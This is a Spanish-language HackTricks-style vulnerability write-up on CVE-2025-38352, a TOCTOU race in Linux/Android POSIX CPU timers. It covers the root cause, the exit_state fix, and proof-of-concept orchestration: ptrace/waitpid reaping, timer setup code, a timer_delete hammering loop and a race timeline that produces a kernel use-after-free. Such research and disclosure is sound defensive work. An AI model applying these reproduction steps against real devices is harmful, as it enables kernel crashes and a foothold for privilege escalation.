# POSIX CPU Timers TOCTOU race (CVE-2025-38352)

{{#include ../../../banners/hacktricks-training.md}}

Esta página documenta una condición de carrera TOCTOU en los POSIX CPU timers de Linux/Android que puede corromper el estado del timer y provocar el crash del kernel, y que en algunas circunstancias puede emplearse para escalada de privilegios.

- Componente afectado: kernel/time/posix-cpu-timers.c
- Primitiva: carrera entre expiración y eliminación durante la salida de la tarea
- Dependiente de la configuración: CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n (ruta de expiración en contexto IRQ)

Breve repaso interno (relevante para la explotación)
- Tres relojes de CPU llevan la contabilización de los timers vía cpu_clock_sample():
- CPUCLOCK_PROF: utime + stime
- CPUCLOCK_VIRT: utime solo
- CPUCLOCK_SCHED: task_sched_runtime()
- La creación del timer asocia un timer a una task/pid e inicializa los nodos de timerqueue:
```c
static int posix_cpu_timer_create(struct k_itimer *new_timer) {
struct pid *pid;
rcu_read_lock();
pid = pid_for_clock(new_timer->it_clock, false);
if (!pid) { rcu_read_unlock(); return -EINVAL; }
new_timer->kclock = &clock_posix_cpu;
timerqueue_init(&new_timer->it.cpu.node);
new_timer->it.cpu.pid = get_pid(pid);
rcu_read_unlock();
return 0;
}
```
- El armado inserta en una timerqueue por base y puede actualizar la caché de la próxima expiración:
```c
static void arm_timer(struct k_itimer *timer, struct task_struct *p) {
struct posix_cputimer_base *base = timer_base(timer, p);
struct cpu_timer *ctmr = &timer->it.cpu;
u64 newexp = cpu_timer_getexpires(ctmr);
if (!cpu_timer_enqueue(&base->tqhead, ctmr)) return;
if (newexp < base->nextevt) base->nextevt = newexp;
}
```
- La ruta rápida evita el procesamiento costoso a menos que las expiraciones en caché indiquen un posible disparo:
```c
static inline bool fastpath_timer_check(struct task_struct *tsk) {
struct posix_cputimers *pct = &tsk->posix_cputimers;
if (!expiry_cache_is_inactive(pct)) {
u64 samples[CPUCLOCK_MAX];
task_sample_cputime(tsk, samples);
if (task_cputimers_expired(samples, pct))
return true;
}
return false;
}
```
- Expiración recoge temporizadores expirados, los marca como disparados, los saca de la cola; la entrega real se pospone:
```c
#define MAX_COLLECTED 20
static u64 collect_timerqueue(struct timerqueue_head *head,
struct list_head *firing, u64 now) {
struct timerqueue_node *next; int i = 0;
while ((next = timerqueue_getnext(head))) {
struct cpu_timer *ctmr = container_of(next, struct cpu_timer, node);
u64 expires = cpu_timer_getexpires(ctmr);
if (++i == MAX_COLLECTED || now < expires) return expires;
ctmr->firing = 1;                           // critical state
rcu_assign_pointer(ctmr->handling, current);
cpu_timer_dequeue(ctmr);
list_add_tail(&ctmr->elist, firing);
}
return U64_MAX;
}
```
Dos modos de procesamiento de expiraciones
- CONFIG_POSIX_CPU_TIMERS_TASK_WORK=y: la expiración se aplaza mediante task_work en la tarea objetivo
- CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n: la expiración se maneja directamente en contexto IRQ

<details>
<summary>Task_work vs IRQ rutas de expiración</summary>
```c
void run_posix_cpu_timers(void) {
struct task_struct *tsk = current;
__run_posix_cpu_timers(tsk);
}
#ifdef CONFIG_POSIX_CPU_TIMERS_TASK_WORK
static inline void __run_posix_cpu_timers(struct task_struct *tsk) {
if (WARN_ON_ONCE(tsk->posix_cputimers_work.scheduled)) return;
tsk->posix_cputimers_work.scheduled = true;
task_work_add(tsk, &tsk->posix_cputimers_work.work, TWA_RESUME);
}
#else
static inline void __run_posix_cpu_timers(struct task_struct *tsk) {
lockdep_posixtimer_enter();
handle_posix_cpu_timers(tsk);                  // IRQ-context path
lockdep_posixtimer_exit();
}
#endif
```
</details>

En la ruta IRQ-context, la lista de disparo se procesa fuera de sighand

<details>
<summary>Bucle de entrega IRQ-context</summary>
```c
static void handle_posix_cpu_timers(struct task_struct *tsk) {
struct k_itimer *timer, *next; unsigned long flags, start;
LIST_HEAD(firing);
if (!lock_task_sighand(tsk, &flags)) return;   // may fail on exit
do {
start = READ_ONCE(jiffies); barrier();
check_thread_timers(tsk, &firing);
check_process_timers(tsk, &firing);
} while (!posix_cpu_timers_enable_work(tsk, start));
unlock_task_sighand(tsk, &flags);              // race window opens here
list_for_each_entry_safe(timer, next, &firing, it.cpu.elist) {
int cpu_firing;
spin_lock(&timer->it_lock);
list_del_init(&timer->it.cpu.elist);
cpu_firing = timer->it.cpu.firing;         // read then reset
timer->it.cpu.firing = 0;
if (likely(cpu_firing >= 0)) cpu_timer_fire(timer);
rcu_assign_pointer(timer->it.cpu.handling, NULL);
spin_unlock(&timer->it_lock);
}
}
```
</details>

Causa raíz: TOCTOU entre la expiración en tiempo de IRQ y la eliminación concurrente durante la salida de la tarea
Precondiciones
- CONFIG_POSIX_CPU_TIMERS_TASK_WORK está deshabilitado (ruta IRQ en uso)
- La tarea objetivo está saliendo pero no ha sido completamente recolectada
- Otro hilo llama concurrentemente a posix_cpu_timer_del() para el mismo timer

Secuencia
1) update_process_times() provoca que run_posix_cpu_timers() se ejecute en contexto IRQ para la tarea que está saliendo.
2) collect_timerqueue() establece ctmr->firing = 1 y mueve el timer a la lista temporal de firing.
3) handle_posix_cpu_timers() suelta sighand vía unlock_task_sighand() para entregar timers fuera del lock.
4) Inmediatamente después del unlock, la tarea que está saliendo puede ser recolectada; un hilo hermano ejecuta posix_cpu_timer_del().
5) En esta ventana, posix_cpu_timer_del() puede fallar al adquirir state vía cpu_timer_task_rcu()/lock_task_sighand() y por tanto omitir la guardia normal in-flight que comprueba timer->it.cpu.firing. La eliminación procede como si no estuviera firing, corrompiendo el estado mientras se maneja la expiración, provocando crashes/UB.

### Cómo release_task() y timer_delete() liberan timers en firing
Incluso después de que handle_posix_cpu_timers() haya quitado el timer de la lista de la tarea, un zombie ptraced aún puede ser recolectado. La pila de waitpid() impulsa release_task() → __exit_signal(), que desmantela sighand y las colas de señales mientras otra CPU todavía mantiene punteros al objeto timer:
```c
static void __exit_signal(struct task_struct *tsk)
{
struct sighand_struct *sighand = lock_task_sighand(tsk, NULL);
// ... signal cleanup elided ...
tsk->sighand = NULL;             // makes future lock_task_sighand() fail
unlock_task_sighand(tsk, NULL);
}
```
Con sighand desacoplado, timer_delete() aún devuelve éxito porque posix_cpu_timer_del() deja `ret = 0` cuando el bloqueo falla, por lo que la syscall procede a liberar el objeto vía RCU:
```c
static int posix_cpu_timer_del(struct k_itimer *timer)
{
struct sighand_struct *sighand = lock_task_sighand(p, &flags);
if (unlikely(!sighand))
goto out;                   // ret stays 0 -> userland sees success
// ... normal unlink path ...
}
```

```c
SYSCALL_DEFINE1(timer_delete, timer_t, timer_id)
{
if (timer_delete_hook(timer) == TIMER_RETRY)
timer = timer_wait_running(timer, &flags);
posix_timer_unhash_and_free(timer);            // call_rcu(k_itimer_rcu_free)
return 0;
}
```
Porque el objeto slab es RCU-freed mientras el contexto IRQ aún recorre la lista `firing`, la reutilización del timer cache se convierte en una primitiva UAF.

### Dirigir el reaping con ptrace + waitpid
La forma más simple de mantener un zombie presente sin que sea auto-reaped es ptracear un hilo worker que no sea líder. exit_notify() primero establece `exit_state = EXIT_ZOMBIE` y solo pasa a EXIT_DEAD si `autoreap` es true. Para hilos ptraceados, `autoreap = do_notify_parent()` permanece false siempre que SIGCHLD no esté ignorada, así que release_task() solo se ejecuta cuando el padre llama explícitamente a waitpid():

- Use pthread_create() dentro del tracee para que la víctima no sea el thread-group leader (wait_task_zombie() maneja non-leaders ptraceados).
- El padre ejecuta `ptrace(PTRACE_ATTACH, tid)` y luego `waitpid(tid, __WALL)` para impulsar do_wait_pid() → wait_task_zombie() → release_task().
- Pipes o shared memory comunican el TID exacto al padre para que el worker correcto sea reaped a demanda.

Esta coreografía garantiza una ventana en la que handle_posix_cpu_timers() aún puede referenciar `tsk->sighand`, mientras que un waitpid() posterior lo destruye y permite que timer_delete() recupere el mismo objeto k_itimer.

Por qué el modo TASK_WORK es seguro por diseño
- Con CONFIG_POSIX_CPU_TIMERS_TASK_WORK=y, el expiry se difiere a task_work; exit_task_work se ejecuta antes de exit_notify, por lo que no ocurre la superposición en tiempo IRQ con el reaping.
- Aun así, si la tarea ya está saliendo, task_work_add() falla; el control por exit_state hace que ambos modos sean consistentes.

Fix (Android common kernel) and rationale
- Add an early return if current task is exiting, gating all processing:
```c
// kernel/time/posix-cpu-timers.c (Android common kernel commit 157f357d50b5038e5eaad0b2b438f923ac40afeb)
if (tsk->exit_state)
return;
```
- Esto impide entrar en handle_posix_cpu_timers() para tareas que están saliendo, eliminando la ventana donde posix_cpu_timer_del() podría pasar por alto it.cpu.firing y competir (race) con el procesamiento de expiración.

Impacto
- La corrupción de memoria del kernel en las estructuras de temporizador durante la expiración/eliminación concurrente puede provocar fallos inmediatos (DoS) y constituye una primitiva potente para la escalada de privilegios debido a las oportunidades de manipulación arbitraria del estado del kernel.

Desencadenar el bug (condiciones seguras y reproducibles)
Build/config
- Asegúrese de que CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n y use un kernel sin la corrección de gating de exit_state. En x86/arm64 la opción normalmente se fuerza vía HAVE_POSIX_CPU_TIMERS_TASK_WORK, por lo que los investigadores a menudo parchean `kernel/time/Kconfig` para exponer un interruptor manual:
```c
config POSIX_CPU_TIMERS_TASK_WORK
bool "CVE-2025-38352: POSIX CPU timers task_work toggle" if EXPERT
depends on POSIX_TIMERS && HAVE_POSIX_CPU_TIMERS_TASK_WORK
default y
```
Esto refleja lo que hicieron los fabricantes de Android para las compilaciones de análisis; en upstream x86_64 y arm64 se fuerza HAVE_POSIX_CPU_TIMERS_TASK_WORK=y, por lo que la ruta vulnerable IRQ existe principalmente en los kernels Android de 32 bits donde la opción está compilada fuera.

- Ejecuta en una VM multinúcleo (p. ej., QEMU `-smp cores=4`) para que el padre, el hilo principal del hijo y los hilos de trabajo puedan permanecer fijados a CPUs dedicadas.

Runtime strategy
- Apunta a un hilo que está a punto de terminar y adjunta un CPU timer a él (reloj por hilo o a nivel de proceso):
- For per-thread: timer_create(CLOCK_THREAD_CPUTIME_ID, ...)
- For process-wide: timer_create(CLOCK_PROCESS_CPUTIME_ID, ...)
- Actívalo con una expiración inicial muy corta y un intervalo pequeño para maximizar las entradas en la ruta IRQ:
```c
static timer_t t;
static void setup_cpu_timer(void) {
struct sigevent sev = {0};
sev.sigev_notify = SIGEV_SIGNAL;    // delivery type not critical for the race
sev.sigev_signo = SIGUSR1;
if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &t)) perror("timer_create");
struct itimerspec its = {0};
its.it_value.tv_nsec = 1;           // fire ASAP
its.it_interval.tv_nsec = 1;        // re-fire
if (timer_settime(t, 0, &its, NULL)) perror("timer_settime");
}
```
- Desde un hilo hermano, eliminar de forma concurrente el mismo temporizador mientras el hilo objetivo termina:
```c
void *deleter(void *arg) {
for (;;) (void)timer_delete(t);     // hammer delete in a loop
}
```
- Amplificadores de race: alta tasa de ticks del scheduler, carga de CPU, ciclos repetidos de salida/re-creación de hilos. El crash típicamente se manifiesta cuando posix_cpu_timer_del() omite detectar el firing debido a una búsqueda/bloqueo de task fallida justo después de unlock_task_sighand().

### Orquestación práctica del PoC
#### Coreografía de hilos e IPC
Un reproducer fiable hace fork en un parent que ptracea y un child que crea el worker vulnerable. Dos pipes (`c2p`, `p2c`) entregan el TID del worker y regulan cada fase, mientras que un `pthread_barrier_t` evita que el worker arme su timer hasta que el parent se haya attachado. Cada proceso o hilo se fija con `sched_setaffinity()` (p. ej., parent en CPU1, child main en CPU0, worker en CPU2) para minimizar el ruido del scheduler y mantener la race reproducible.

#### Calibración del timer con CLOCK_THREAD_CPUTIME_ID
El worker arma un per-thread CPU timer de modo que sólo su propio consumo de CPU avance el deadline. Un `wait_time` ajustable (por defecto ≈250 µs de tiempo CPU) más un busy loop acotado aseguran que `exit_notify()` ponga `EXIT_ZOMBIE` justo cuando el timer está a punto de dispararse:

<details>
<summary>Minimal per-thread CPU timer skeleton</summary>
```c
static timer_t timer;
static long wait_time = 250000; // nanoseconds of CPU time

static void timer_fire(sigval_t unused) {
puts("timer fired");
}

static void *worker(void *arg) {
struct sigevent sev = {0};
sev.sigev_notify = SIGEV_THREAD;
sev.sigev_notify_function = timer_fire;
timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &timer);

struct itimerspec ts = {
.it_interval = {0, 0},
.it_value    = {0, wait_time},
};

pthread_barrier_wait(&barrier);  // released by child main after ptrace attach
timer_settime(timer, 0, &ts, NULL);

for (volatile int i = 0; i < 1000000; i++); // burn CPU before exiting
return NULL;                                 // do_exit() keeps burning CPU
}
```
</details>

#### Cronología de la carrera
1. El proceso hijo le comunica al proceso padre el TID del worker vía `c2p`, luego se bloquea en la barrera.
2. El proceso padre ejecuta `PTRACE_ATTACH`, espera en `waitpid(__WALL)`, luego hace `PTRACE_CONT` para permitir que el worker siga y salga.
3. Cuando las heurísticas (o la intervención manual del operador) sugieren que el timer fue recogido en la lista `firing` del lado IRQ, el padre ejecuta `waitpid(tid, __WALL)` de nuevo para desencadenar release_task() y soltar `tsk->sighand`.
4. El padre señala al hijo vía `p2c` para que el main del hijo pueda llamar a `timer_delete(timer)` y ejecutar inmediatamente un helper como `wait_for_rcu()` hasta que la callback RCU del timer complete.
5. El contexto IRQ finalmente reanuda `handle_posix_cpu_timers()` y desreferencia el `struct k_itimer` liberado, provocando KASAN o WARN_ON()s.

#### Instrumentación opcional del kernel
En entornos de investigación, inyectar un `mdelay(500)` solo para depuración dentro de handle_posix_cpu_timers() cuando `tsk->comm == "SLOWME"` amplía la ventana temporal para que la coreografía anterior casi siempre gane la carrera. El mismo PoC también renombra hilos (`prctl(PR_SET_NAME, ...)`) para que los logs del kernel y los breakpoints confirmen que el worker esperado está siendo recolectado.

### Indicadores de instrumentación durante la explotación
- Añadir tracepoints/WARN_ONCE alrededor de unlock_task_sighand()/posix_cpu_timer_del() para detectar casos donde `it.cpu.firing==1` coincide con fallos en cpu_timer_task_rcu()/lock_task_sighand(); monitorizar la consistencia del timerqueue cuando la víctima sale.
- KASAN típicamente reporta `slab-use-after-free` dentro de posix_timer_queue_signal(), mientras que kernels sin KASAN registran WARN_ON_ONCE() desde send_sigqueue() cuando la carrera tiene éxito, proporcionando un indicador rápido de éxito.

Puntos críticos de auditoría (para revisores)
- update_process_times() → run_posix_cpu_timers() (IRQ)
- __run_posix_cpu_timers() selection (TASK_WORK vs IRQ path)
- collect_timerqueue(): establece ctmr->firing y mueve nodos
- handle_posix_cpu_timers(): libera `sighand` antes del bucle de firing
- posix_cpu_timer_del(): se basa en it.cpu.firing para detectar expiración en vuelo; esta comprobación se omite cuando la búsqueda/bloqueo de la tarea falla durante exit/reap

Notas para investigación de explotación
- El comportamiento divulgado es una primitiva fiable para provocar crash del kernel; convertirlo en escalada de privilegios normalmente requiere un solapamiento adicional controlable (duración de objeto o influencia write-what-where) fuera del alcance de este resumen. Trate cualquier PoC como potencialmente desestabilizador y ejecútelo solo en emuladores/VMs.

## References
- [Race Against Time in the Kernel’s Clockwork (StreyPaws)](https://streypaws.github.io/posts/Race-Against-Time-in-the-Kernel-Clockwork/)
- [Android security bulletin – September 2025](https://source.android.com/docs/security/bulletin/2025-09-01)
- [Android common kernel patch commit 157f357d50b5…](https://android.googlesource.com/kernel/common/+/157f357d50b5038e5eaad0b2b438f923ac40afeb%5E%21/#F0)
- [CVE-2025-38352 – In-the-wild Android Kernel Vulnerability Analysis and PoC](https://faith2dxy.xyz/2025-12-22/cve_2025_38352_analysis/)
- [poc-CVE-2025-38352 (GitHub)](https://github.com/farazsth98/poc-CVE-2025-38352)
- [Linux stable fix commit f90fff1e152d](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=f90fff1e152dedf52b932240ebbd670d83330eca)

{{#include ../../../banners/hacktricks-training.md}}
